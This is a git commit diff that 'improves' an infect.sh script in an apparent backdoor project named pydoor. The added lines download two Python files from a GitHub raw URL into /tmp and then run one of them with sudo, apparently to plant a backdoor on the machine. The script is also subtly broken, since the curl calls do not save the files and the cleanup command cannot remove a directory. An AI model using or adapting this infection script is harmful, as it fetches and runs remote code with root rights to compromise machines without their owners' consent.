b98d15be20fe16429494cb6d9124a75c53aceb2f
x41lakazam <x41lakazam@gmail.com>
2020-05-05 16:17:59 +0300

    infect script improved

--- client/infect.sh
+++ client/infect.sh
@@ -1,5 +1,14 @@
 #!/bin/bash
 
 cd /tmp
+mkdir pydoor
+echo "Downloading inker"
+curl https://raw.githubusercontent.com/x41lakazam/pydoor/master/client/inker.py
+echo "Downloading pydoor"
+curl https://raw.githubusercontent.com/x41lakazam/pydoor/master/client/pydoor.py
+echo "Running inker"
 sudo python inker.py
+echo "Success"
+cd /tmp
+rm pydoor
 
